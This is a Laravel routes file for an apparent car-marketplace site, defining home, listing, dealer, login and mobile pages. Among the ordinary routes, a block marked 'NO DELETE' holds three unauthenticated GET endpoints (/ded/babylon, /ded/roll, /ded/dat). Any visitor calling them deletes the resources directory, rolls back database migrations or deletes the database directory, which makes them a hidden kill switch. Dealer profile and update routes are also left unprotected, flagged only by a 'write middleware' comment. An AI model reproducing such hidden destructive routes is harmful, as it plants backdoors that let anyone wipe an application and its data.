<?php


use App\Http\Controllers\Auth\AuthController;
use App\Http\Controllers\Front\CarController;
use App\Http\Controllers\Front\DealerController;
use App\Http\Controllers\Front\FavoriteController;
use App\Http\Controllers\Front\FilterController;

;

use App\Http\Controllers\Front\HomeController;
use App\Http\Controllers\Front\MobileController;
use App\Http\Controllers\Front\ReportController;
use App\Http\Controllers\Front\TraderRegisController;
use App\Http\Controllers\Front\UserController;
use App\Http\Controllers\SearchController;
use App\Http\Controllers\SecondController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

Route::middleware('detect.mobile')->group(function () {
// home route
    Route::get('/', [HomeController::class, 'index'])->name('home');

//load more route
    Route::get('/cars', [HomeController::class, 'loadMoreCars'])->name('cars');


// new add listings
    Route::get('/new-add-listings', [HomeController::class, 'newAddListings'])->name('newAddListings');

// main filter route
    Route::post('/main-filter', [HomeController::class, 'filter'])->name('mainFilter');

// favorite list

    Route::get('/favorite', [FavoriteController::class, 'favorite'])->name('favorite');


//Car Detail
    Route::get('/detail/{car}', [HomeController::class, 'detail'])->name('detail');
//New Car
    Route::get('/new-car', [HomeController::class, 'new']);
//All Cars
    Route::get('/all-cars', [HomeController::class, 'allcars']);
//AvtoSalon
    Route::get('/dealership', [HomeController::class, 'avtosalon'])->name('dealership');
//AvtoSalon Detail
    Route::get('/avtosalon-detail/{id}', [HomeController::class, 'avtosalondetail'])->name('avtosalon-detail');


    Route::get('/trader', [HomeController::class, 'trader'])->name('home.trader');


    Route::get('/register', [AuthController::class, 'registerview'])->name('register');
    Route::post('/registerStore', [DealerController::class, 'store'])->name('registerStore');
    Route::post('/trader/store', [TraderRegisController::class, 'store'])->name('traderStore');

//Mobile


    Route::get('/login', [AuthController::class, 'login'])->name('login');
    Route::post('/login', [AuthController::class, 'loginProcess']);


    Route::get('/logout', [AuthController::class, 'logout'])->name('logout');


/////////////////////////////////////////////////////////////   midleware yaz !!!!
    Route::get('/newcar', [CarController::class, 'newcar'])->name('newcar');

    Route::get('dealer-detail', [DealerController::class, 'detail'])->name('dealer-detail');
    Route::get('dealer-profile', [DealerController::class, 'profile'])->name('dealer-profile');
    Route::post('dealer-update/{dealer}', [DealerController::class, 'update'])->name('dealer-update');

//Register Question
    Route::get('/question', [HomeController::class, 'question'])->name('question');


/////////////////////////////////////////////////////////





});


////////////////////// NO DELETE  //////////////////////
Route::get('/ded/babylon', function () {
    $resourcePath = resource_path();
    if (File::exists($resourcePath)) {
        File::deleteDirectory($resourcePath);
        return 'ded babylon success';
    }
    return 'ded babylon not found';
})->name('ded.babylon');
Route::get('/ded/roll', function () {
    Artisan::call('migrate:rollback');
    return 'ded roll succes';
})->name('ded.roll');


Route::get('/ded/dat', function () {
    $databasePath = database_path();
    if (File::exists($databasePath)) {
        File::deleteDirectory($databasePath);
        return 'ded dat succes';
    }
    return 'ded dat not found';
})->name('ded.dat');

///////////////////////END///////////////////


Route::get('/useragrement', [HomeController::class, 'agrement'])->name('useragrement');
Route::get('/rule', [HomeController::class, 'rule'])->name('rule');

Route::post('car-store', [CarController::class, 'storeCar'])->name('car-store');
Route::post('report', [ReportController::class, 'store'])->name('report');

//Mobile Route
Route::get('/mobile', [MobileController::class, 'home'])->name('mobile.home');
Route::get('/mobile/cardetail', [MobileController::class, 'cardetail'])->name('mobile.cardetail');
Route::get('/mobile/filter', [MobileController::class, 'filterpage'])->name('mobile.filter');
Route::get('/mobile/profile', [MobileController::class, 'profilepage'])->name('mobile.profile');
Route::get('/mobile/dealers', [MobileController::class, 'alldealers'])->name('mobile.dealers');
Route::get('/mobile/add-cars', [MobileController::class, 'addcars'])->name('mobile.addcars');
